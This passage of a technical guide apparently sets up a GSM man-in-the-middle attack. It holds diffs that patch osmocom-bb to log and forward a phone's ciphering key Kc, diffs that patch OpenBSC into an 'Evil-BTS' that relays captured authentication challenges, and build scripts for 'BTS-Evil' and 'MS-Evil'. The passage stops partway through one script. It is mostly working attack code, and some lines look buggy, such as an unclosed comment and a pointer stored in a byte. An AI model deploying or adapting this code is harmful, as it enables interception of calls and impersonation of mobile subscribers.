</section>
<section id="genuine-ms-kc-forwarding" class="level1">
<h1>Genuine-MS (Kc Forwarding)</h1>
<p>Patch osmocom-bb</p>
<div class="sourceCode" id="cb17"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/osmocom/osmocom-bb</span>
<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout fixeria/trxcon</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb18"><pre class="sourceCode patch code-with-copy"><code class="sourceCode diff"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="kw">diff -ru trx/src/host/layer23/src/mobile/gsm48_mm.c osmocom-bb/src/host/layer23/src/mobile/gsm48_mm.c</span></span>
<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a><span class="dt">--- trx/src/host/layer23/src/mobile/gsm48_mm.c  2022-08-30 16:41:37.076916961 +0200</span></span>
<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a><span class="dt">+++ osmocom-bb/src/host/layer23/src/mobile/gsm48_mm.c   2022-08-30 15:51:17.267099639 +0200</span></span>
<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -1651,6 +1651,7 @@</span></span>
<span id="cb18-5"><a href="#cb18-5" aria-hidden="true" tabindex="-1"></a>     */</span>
<span id="cb18-6"><a href="#cb18-6" aria-hidden="true" tabindex="-1"></a>    if (mm-&gt;est_cause == RR_EST_CAUSE_EMERGENCY &amp;&amp; set-&gt;emergency_imsi[0])</span>
<span id="cb18-7"><a href="#cb18-7" aria-hidden="true" tabindex="-1"></a>        no_sim = 1;</span>
<span id="cb18-8"><a href="#cb18-8" aria-hidden="true" tabindex="-1"></a><span class="va">+   LOGP(DMM, LOGL_INFO, "AUTHENTICATION REQUEST (rand %s)\n", osmo_hexdump(ar-&gt;rand,16));  </span></span>
<span id="cb18-9"><a href="#cb18-9" aria-hidden="true" tabindex="-1"></a>    gsm_subscr_generate_kc(ms, ar-&gt;key_seq, ar-&gt;rand, no_sim);</span>
<span id="cb18-10"><a href="#cb18-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-11"><a href="#cb18-11" aria-hidden="true" tabindex="-1"></a>    /* wait for auth response event from SIM */</span>
<span id="cb18-12"><a href="#cb18-12" aria-hidden="true" tabindex="-1"></a><span class="kw">diff -ru trx/src/host/layer23/src/mobile/subscriber.c osmocom-bb/src/host/layer23/src/mobile/subscriber.c</span></span>
<span id="cb18-13"><a href="#cb18-13" aria-hidden="true" tabindex="-1"></a><span class="dt">--- trx/src/host/layer23/src/mobile/subscriber.c    2022-08-30 16:41:37.076916961 +0200</span></span>
<span id="cb18-14"><a href="#cb18-14" aria-hidden="true" tabindex="-1"></a><span class="dt">+++ osmocom-bb/src/host/layer23/src/mobile/subscriber.c 2022-08-30 15:51:17.267099639 +0200</span></span>
<span id="cb18-15"><a href="#cb18-15" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -32,7 +32,7 @@</span></span>
<span id="cb18-16"><a href="#cb18-16" aria-hidden="true" tabindex="-1"></a> #include &lt;osmocom/bb/common/sap_proto.h&gt;</span>
<span id="cb18-17"><a href="#cb18-17" aria-hidden="true" tabindex="-1"></a> #include &lt;osmocom/bb/common/networks.h&gt;</span>
<span id="cb18-18"><a href="#cb18-18" aria-hidden="true" tabindex="-1"></a> #include &lt;osmocom/bb/mobile/vty.h&gt;</span>
<span id="cb18-19"><a href="#cb18-19" aria-hidden="true" tabindex="-1"></a><span class="st">-</span></span>
<span id="cb18-20"><a href="#cb18-20" aria-hidden="true" tabindex="-1"></a><span class="va">+#include "client.h"</span></span>
<span id="cb18-21"><a href="#cb18-21" aria-hidden="true" tabindex="-1"></a> /* enable to get an empty list of forbidden PLMNs, even if stored on SIM.</span>
<span id="cb18-22"><a href="#cb18-22" aria-hidden="true" tabindex="-1"></a>  * if list is changed, the result is not written back to SIM */</span>
<span id="cb18-23"><a href="#cb18-23" aria-hidden="true" tabindex="-1"></a> //#define TEST_EMPTY_FPLMN</span>
<span id="cb18-24"><a href="#cb18-24" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -369,6 +369,7 @@</span></span>
<span id="cb18-25"><a href="#cb18-25" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-26"><a href="#cb18-26" aria-hidden="true" tabindex="-1"></a>    /* key */</span>
<span id="cb18-27"><a href="#cb18-27" aria-hidden="true" tabindex="-1"></a>    memcpy(subscr-&gt;key, data, 8);</span>
<span id="cb18-28"><a href="#cb18-28" aria-hidden="true" tabindex="-1"></a><span class="va">+   //client(osmo_hexdump(subscr-&gt;key,8));</span></span>
<span id="cb18-29"><a href="#cb18-29" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-30"><a href="#cb18-30" aria-hidden="true" tabindex="-1"></a>    /* key sequence */</span>
<span id="cb18-31"><a href="#cb18-31" aria-hidden="true" tabindex="-1"></a>    subscr-&gt;key_seq = data[8] &amp; 0x07;</span>
<span id="cb18-32"><a href="#cb18-32" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -907,7 +908,7 @@</span></span>
<span id="cb18-33"><a href="#cb18-33" aria-hidden="true" tabindex="-1"></a>    struct msgb *nmsg;</span>
<span id="cb18-34"><a href="#cb18-34" aria-hidden="true" tabindex="-1"></a>    struct sim_hdr *nsh;</span>
<span id="cb18-35"><a href="#cb18-35" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-36"><a href="#cb18-36" aria-hidden="true" tabindex="-1"></a><span class="st">-   /* not a SIM */</span></span>
<span id="cb18-37"><a href="#cb18-37" aria-hidden="true" tabindex="-1"></a><span class="va">+   /* not a SIM</span></span>
<span id="cb18-38"><a href="#cb18-38" aria-hidden="true" tabindex="-1"></a>    if (!GSM_SIM_IS_READER(subscr-&gt;sim_type)</span>
<span id="cb18-39"><a href="#cb18-39" aria-hidden="true" tabindex="-1"></a>     || !subscr-&gt;sim_valid || no_sim) {</span>
<span id="cb18-40"><a href="#cb18-40" aria-hidden="true" tabindex="-1"></a>        struct gsm48_mm_event *nmme;</span>
<span id="cb18-41"><a href="#cb18-41" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -944,6 +945,7 @@</span></span>
<span id="cb18-42"><a href="#cb18-42" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-43"><a href="#cb18-43" aria-hidden="true" tabindex="-1"></a>        /* store sequence */</span>
<span id="cb18-44"><a href="#cb18-44" aria-hidden="true" tabindex="-1"></a>        subscr-&gt;key_seq = key_seq;</span>
<span id="cb18-45"><a href="#cb18-45" aria-hidden="true" tabindex="-1"></a><span class="va">+       //client(osmo_hexdump(vec-&gt;kc,8));</span></span>
<span id="cb18-46"><a href="#cb18-46" aria-hidden="true" tabindex="-1"></a>        memcpy(subscr-&gt;key, vec-&gt;kc, 8);</span>
<span id="cb18-47"><a href="#cb18-47" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-48"><a href="#cb18-48" aria-hidden="true" tabindex="-1"></a>        LOGP(DMM, LOGL_INFO, "Sending authentication response\n");</span>
<span id="cb18-49"><a href="#cb18-49" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -969,6 +971,7 @@</span></span>
<span id="cb18-50"><a href="#cb18-50" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-51"><a href="#cb18-51" aria-hidden="true" tabindex="-1"></a>    /* random */</span>
<span id="cb18-52"><a href="#cb18-52" aria-hidden="true" tabindex="-1"></a>    memcpy(msgb_put(nmsg, 16), rand, 16);</span>
<span id="cb18-53"><a href="#cb18-53" aria-hidden="true" tabindex="-1"></a><span class="va">+   LOGP(DMM, LOGL_NOTICE, "Key Sequence=%d\n",key_seq);</span></span>
<span id="cb18-54"><a href="#cb18-54" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-55"><a href="#cb18-55" aria-hidden="true" tabindex="-1"></a>    /* store sequence */</span>
<span id="cb18-56"><a href="#cb18-56" aria-hidden="true" tabindex="-1"></a>    subscr-&gt;key_seq = key_seq;</span>
<span id="cb18-57"><a href="#cb18-57" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -1019,7 +1022,9 @@</span></span>
<span id="cb18-58"><a href="#cb18-58" aria-hidden="true" tabindex="-1"></a>    nsh-&gt;file = 0x6f20;</span>
<span id="cb18-59"><a href="#cb18-59" aria-hidden="true" tabindex="-1"></a>    data = msgb_put(nmsg, 9);</span>
<span id="cb18-60"><a href="#cb18-60" aria-hidden="true" tabindex="-1"></a>    memcpy(data, subscr-&gt;key, 8);</span>
<span id="cb18-61"><a href="#cb18-61" aria-hidden="true" tabindex="-1"></a><span class="st">-   data[8] = subscr-&gt;key_seq;</span></span>
<span id="cb18-62"><a href="#cb18-62" aria-hidden="true" tabindex="-1"></a><span class="va">+        LOGP(DMM, LOGL_NOTICE, "KC=%s\n",osmo_hexdump(subscr-&gt;key,8));</span></span>
<span id="cb18-63"><a href="#cb18-63" aria-hidden="true" tabindex="-1"></a><span class="va">+   client(osmo_hexdump(subscr-&gt;key,8));</span></span>
<span id="cb18-64"><a href="#cb18-64" aria-hidden="true" tabindex="-1"></a><span class="va">+   data[8] = subscr-&gt;key;</span></span>
<span id="cb18-65"><a href="#cb18-65" aria-hidden="true" tabindex="-1"></a>    sim_job(ms, nmsg);</span>
<span id="cb18-66"><a href="#cb18-66" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-67"><a href="#cb18-67" aria-hidden="true" tabindex="-1"></a>    /* return signed response */</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="patch-openbsc-evil-bts" class="level1">
<h1>Patch OpenBSC Evil-BTS:</h1>
<div class="sourceCode" id="cb19"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/osmocom/openbsc</span>
<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout 3f457a3b79e2908664b40eab9ca8e70c44a54898</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb20"><pre class="sourceCode patch code-with-copy"><code class="sourceCode diff"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="kw">diff -ru openbsc/openbsc/src/libmsc/gsm_04_08.c bsc-2rfa/openbsc/src/libmsc/gsm_04_08.c</span></span>
<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a><span class="dt">--- openbsc/openbsc/src/libmsc/gsm_04_08.c  2022-08-30 16:59:20.033455224 +0200</span></span>
<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a><span class="dt">+++ bsc-2rfa/openbsc/src/libmsc/gsm_04_08.c 2022-08-30 15:51:17.243099474 +0200</span></span>
<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -70,7 +70,10 @@</span></span>
<span id="cb20-5"><a href="#cb20-5" aria-hidden="true" tabindex="-1"></a> #include &lt;osmocom/gsm/tlv.h&gt;</span>
<span id="cb20-6"><a href="#cb20-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-7"><a href="#cb20-7" aria-hidden="true" tabindex="-1"></a> #include &lt;assert.h&gt;</span>
<span id="cb20-8"><a href="#cb20-8" aria-hidden="true" tabindex="-1"></a><span class="va">+#include "server.h"</span></span>
<span id="cb20-9"><a href="#cb20-9" aria-hidden="true" tabindex="-1"></a><span class="va">+#include "hex.h"</span></span>
<span id="cb20-10"><a href="#cb20-10" aria-hidden="true" tabindex="-1"></a><span class="va">+#include "client.h"</span></span>
<span id="cb20-11"><a href="#cb20-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-12"><a href="#cb20-12" aria-hidden="true" tabindex="-1"></a> void *tall_locop_ctx;</span>
<span id="cb20-13"><a href="#cb20-13" aria-hidden="true" tabindex="-1"></a> void *tall_authciphop_ctx;</span>
<span id="cb20-14"><a href="#cb20-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-15"><a href="#cb20-15" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -908,6 +911,20 @@</span></span>
<span id="cb20-16"><a href="#cb20-16" aria-hidden="true" tabindex="-1"></a>    struct msgb *msg = gsm48_msgb_alloc_name("GSM 04.08 AUTH REQ");</span>
<span id="cb20-17"><a href="#cb20-17" aria-hidden="true" tabindex="-1"></a>    struct gsm48_hdr *gh = (struct gsm48_hdr *) msgb_put(msg, sizeof(*gh));</span>
<span id="cb20-18"><a href="#cb20-18" aria-hidden="true" tabindex="-1"></a>    struct gsm48_auth_req *ar = (struct gsm48_auth_req *) msgb_put(msg, sizeof(*ar));</span>
<span id="cb20-19"><a href="#cb20-19" aria-hidden="true" tabindex="-1"></a><span class="va">+        DEBUGP(DMM, "-&gt; AUTH REQ (rand = %s)\n", osmo_hexdump(rand, 16));</span></span>
<span id="cb20-20"><a href="#cb20-20" aria-hidden="true" tabindex="-1"></a><span class="va">+   </span></span>
<span id="cb20-21"><a href="#cb20-21" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb20-22"><a href="#cb20-22" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb20-23"><a href="#cb20-23" aria-hidden="true" tabindex="-1"></a><span class="va">+   char *test;</span></span>
<span id="cb20-24"><a href="#cb20-24" aria-hidden="true" tabindex="-1"></a><span class="va">+   test=catch_rand();</span></span>
<span id="cb20-25"><a href="#cb20-25" aria-hidden="true" tabindex="-1"></a><span class="va">+   printf("test %s\n",test);</span></span>
<span id="cb20-26"><a href="#cb20-26" aria-hidden="true" tabindex="-1"></a><span class="va">+   char *randy=strtok(test," -");</span></span>
<span id="cb20-27"><a href="#cb20-27" aria-hidden="true" tabindex="-1"></a><span class="va">+   printf("rand %s\n",rand);</span></span>
<span id="cb20-28"><a href="#cb20-28" aria-hidden="true" tabindex="-1"></a><span class="va">+   char *kandy_seq=strtok(NULL,"-");</span></span>
<span id="cb20-29"><a href="#cb20-29" aria-hidden="true" tabindex="-1"></a><span class="va">+   printf("key_seq %s\n",kandy_seq);</span></span>
<span id="cb20-30"><a href="#cb20-30" aria-hidden="true" tabindex="-1"></a><span class="va">+   char *randy_magnum = spaces(randy);</span></span>
<span id="cb20-31"><a href="#cb20-31" aria-hidden="true" tabindex="-1"></a><span class="va">+        const unsigned char *randynator=hex2ascii(randy_magnum);</span></span>
<span id="cb20-32"><a href="#cb20-32" aria-hidden="true" tabindex="-1"></a><span class="va">+        memcpy(rand,randynator,16);</span></span>
<span id="cb20-33"><a href="#cb20-33" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-34"><a href="#cb20-34" aria-hidden="true" tabindex="-1"></a>    DEBUGP(DMM, "-&gt; AUTH REQ (rand = %s)\n", osmo_hexdump(rand, 16));</span>
<span id="cb20-35"><a href="#cb20-35" aria-hidden="true" tabindex="-1"></a>    if (autn)</span>
<span id="cb20-36"><a href="#cb20-36" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -917,7 +934,7 @@</span></span>
<span id="cb20-37"><a href="#cb20-37" aria-hidden="true" tabindex="-1"></a>    gh-&gt;proto_discr = GSM48_PDISC_MM;</span>
<span id="cb20-38"><a href="#cb20-38" aria-hidden="true" tabindex="-1"></a>    gh-&gt;msg_type = GSM48_MT_MM_AUTH_REQ;</span>
<span id="cb20-39"><a href="#cb20-39" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-40"><a href="#cb20-40" aria-hidden="true" tabindex="-1"></a><span class="st">-   ar-&gt;key_seq = key_seq;</span></span>
<span id="cb20-41"><a href="#cb20-41" aria-hidden="true" tabindex="-1"></a><span class="va">+   ar-&gt;key_seq = kandy_seq;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="installing-bts-evil" class="level1">
<h1>Installing BTS-Evil:</h1>
<div class="sourceCode" id="cb21"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/bbaranoff/heartbreaker</span>
<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> /heartbreaker</span>
<span id="cb21-5"><a href="#cb21-5" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /heartbreaker</span>
<span id="cb21-6"><a href="#cb21-6" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> install autoconf-archive libdbd-sqlite3 gcc-9 g++-9 gcc-10 g++-10 git autoconf pkg-config libtool build-essential libtalloc-dev libpcsclite-dev gnutls-dev python2 python2-dev fftw3-dev libsctp-dev libdbi-dev <span class="at">-y</span></span>
<span id="cb21-7"><a href="#cb21-7" aria-hidden="true" tabindex="-1"></a><span class="fu">cp</span> /usr/bin/python2 /usr/bin/python</span>
<span id="cb21-8"><a href="#cb21-8" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--install</span> /usr/bin/gcc gcc /usr/bin/gcc-9 90 <span class="at">--slave</span> /usr/bin/g++ g++ /usr/bin/g++-9</span>
<span id="cb21-9"><a href="#cb21-9" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--install</span> /usr/bin/gcc gcc /usr/bin/gcc-10 100 <span class="at">--slave</span> /usr/bin/g++ g++ /usr/bin/g++-10</span>
<span id="cb21-10"><a href="#cb21-10" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--set</span> gcc /usr/bin/gcc-9</span>
<span id="cb21-11"><a href="#cb21-11" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone git://git.osmocom.org/libosmocore.git</span>
<span id="cb21-12"><a href="#cb21-12" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span>  libosmocore</span>
<span id="cb21-13"><a href="#cb21-13" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout 1.1.0</span>
<span id="cb21-14"><a href="#cb21-14" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span></span>
<span id="cb21-15"><a href="#cb21-15" aria-hidden="true" tabindex="-1"></a><span class="ex">./configure</span></span>
<span id="cb21-16"><a href="#cb21-16" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span></span>
<span id="cb21-17"><a href="#cb21-17" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> install</span>
<span id="cb21-18"><a href="#cb21-18" aria-hidden="true" tabindex="-1"></a><span class="ex">ldconfig</span></span>
<span id="cb21-19"><a href="#cb21-19" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ..</span>
<span id="cb21-20"><a href="#cb21-20" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone git://git.osmocom.org/libosmo-dsp.git</span>
<span id="cb21-21"><a href="#cb21-21" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> libosmo-dsp</span>
<span id="cb21-22"><a href="#cb21-22" aria-hidden="true" tabindex="-1"></a><span class="ex">libtoolize</span> <span class="kw">&amp;&amp;</span> <span class="ex">autoreconf</span> <span class="at">-fi</span></span>
<span id="cb21-23"><a href="#cb21-23" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span></span>
<span id="cb21-24"><a href="#cb21-24" aria-hidden="true" tabindex="-1"></a><span class="ex">./configure</span></span>
<span id="cb21-25"><a href="#cb21-25" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span></span>
<span id="cb21-26"><a href="#cb21-26" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> install</span>
<span id="cb21-27"><a href="#cb21-27" aria-hidden="true" tabindex="-1"></a><span class="ex">ldconfig</span></span>
<span id="cb21-28"><a href="#cb21-28" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> install <span class="at">-y</span> libortp-dev</span>
<span id="cb21-29"><a href="#cb21-29" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ..</span>
<span id="cb21-30"><a href="#cb21-30" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb21-31"><a href="#cb21-31" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/osmocom/osmocom-bb</span>
<span id="cb21-32"><a href="#cb21-32" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> osmocom-bb/src</span>
<span id="cb21-33"><a href="#cb21-33" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout fixeria/trxcon</span>
<span id="cb21-34"><a href="#cb21-34" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> nofirmware</span>
<span id="cb21-35"><a href="#cb21-35" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb21-36"><a href="#cb21-36" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ../..</span>
<span id="cb21-37"><a href="#cb21-37" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/osmocom/libosmo-abis</span>
<span id="cb21-38"><a href="#cb21-38" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> libosmo-abis</span>
<span id="cb21-39"><a href="#cb21-39" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout 0.8.1</span>
<span id="cb21-40"><a href="#cb21-40" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span> <span class="kw">&amp;&amp;</span> <span class="ex">./configure</span> <span class="at">--disable-dahdi</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> <span class="at">-j4</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> install <span class="kw">&amp;&amp;</span> <span class="ex">ldconfig</span></span>
<span id="cb21-41"><a href="#cb21-41" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb21-42"><a href="#cb21-42" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ..</span>
<span id="cb21-43"><a href="#cb21-43" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/osmocom/libosmo-netif</span>
<span id="cb21-44"><a href="#cb21-44" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> libosmo-netif</span>
<span id="cb21-45"><a href="#cb21-45" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout 0.6.0</span>
<span id="cb21-46"><a href="#cb21-46" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span> <span class="kw">&amp;&amp;</span> <span class="ex">./configure</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> <span class="at">-j4</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> install <span class="kw">&amp;&amp;</span> <span class="ex">ldconfig</span></span>
<span id="cb21-47"><a href="#cb21-47" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb21-48"><a href="#cb21-48" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb21-49"><a href="#cb21-49" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> bsc-2rfa/openbsc</span>
<span id="cb21-50"><a href="#cb21-50" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span> <span class="kw">&amp;&amp;</span> <span class="ex">./configure</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> <span class="at">-j4</span></span>
<span id="cb21-51"><a href="#cb21-51" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ../..</span>
<span id="cb21-52"><a href="#cb21-52" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/osmocom/osmo-bts</span>
<span id="cb21-53"><a href="#cb21-53" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> osmo-bts</span>
<span id="cb21-54"><a href="#cb21-54" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout 0.8.1</span>
<span id="cb21-55"><a href="#cb21-55" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span> <span class="kw">&amp;&amp;</span> <span class="ex">./configure</span> <span class="at">--enable-trx</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> <span class="at">-j4</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> install <span class="kw">&amp;&amp;</span> <span class="ex">ldconfig</span></span>
<span id="cb21-56"><a href="#cb21-56" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb21-57"><a href="#cb21-57" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> install ruby-libxml ruby-dev ruby-dbus</span>
<span id="cb21-58"><a href="#cb21-58" aria-hidden="true" tabindex="-1"></a><span class="ex">gem</span> install serial smartcard</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="installing-ms-evil" class="level1">
<h1>Installing MS-Evil :</h1>
<div class="sourceCode" id="cb22"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/bbaranoff/heartbreaker</span>
<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> /heartbreaker</span>
<span id="cb22-5"><a href="#cb22-5" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /heartbreaker</span>
<span id="cb22-6"><a href="#cb22-6" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> install autoconf-archive libdbd-sqlite3 gcc-9 g++-9 gcc-10 g++-10 git autoconf pkg-config libtool build-essential libtalloc-dev libpcsclite-dev gnutls-dev python2 python2-dev fftw3-dev libsctp-dev libdbi-dev <span class="at">-y</span></span>
<span id="cb22-7"><a href="#cb22-7" aria-hidden="true" tabindex="-1"></a><span class="fu">cp</span> /usr/bin/python2 /usr/bin/python</span>
<span id="cb22-8"><a href="#cb22-8" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--install</span> /usr/bin/gcc gcc /usr/bin/gcc-9 90 <span class="at">--slave</span> /usr/bin/g++ g++ /usr/bin/g++-9</span>
<span id="cb22-9"><a href="#cb22-9" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--install</span> /usr/bin/gcc gcc /usr/bin/gcc-10 100 <span class="at">--slave</span> /usr/bin/g++ g++ /usr/bin/g++-10</span>
<span id="cb22-10"><a href="#cb22-10" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--set</span> gcc /usr/bin/gcc-9</span>
<span id="cb22-11"><a href="#cb22-11" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone git://git.osmocom.org/libosmocore.git</span>
<span id="cb22-12"><a href="#cb22-12" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span>  libosmocore</span>
<span id="cb22-13"><a href="#cb22-13" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout 1.1.0</span>
<span id="cb22-14"><a href="#cb22-14" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span></span>
<span id="cb22-15"><a href="#cb22-15" aria-hidden="true" tabindex="-1"></a><span class="ex">./configure</span></span>
<span id="cb22-16"><a href="#cb22-16" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span></span>
<span id="cb22-17"><a href="#cb22-17" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> install</span>
<span id="cb22-18"><a href="#cb22-18" aria-hidden="true" tabindex="-1"></a><span class="ex">ldconfig</span></span>
<span id="cb22-19"><a href="#cb22-19" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ..</span>
<span id="cb22-20"><a href="#cb22-20" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone git://git.osmocom.org/libosmo-dsp.git</span>
<span id="cb22-21"><a href="#cb22-21" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> libosmo-dsp</span>
<span id="cb22-22"><a href="#cb22-22" aria-hidden="true" tabindex="-1"></a><span class="ex">libtoolize</span> <span class="kw">&amp;&amp;</span> <span class="ex">autoreconf</span> <span class="at">-fi</span></span>
<span id="cb22-23"><a href="#cb22-23" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span></span>
<span id="cb22-24"><a href="#cb22-24" aria-hidden="true" tabindex="-1"></a><span class="ex">./configure</span></span>
<span id="cb22-25"><a href="#cb22-25" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span></span>
<span id="cb22-26"><a href="#cb22-26" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> install</span>
<span id="cb22-27"><a href="#cb22-27" aria-hidden="true" tabindex="-1"></a><span class="ex">ldconfig</span></span>
<span id="cb22-28"><a href="#cb22-28" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> install <span class="at">-y</span> libortp-dev</span>
<span id="cb22-29"><a href="#cb22-29" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ..</span>
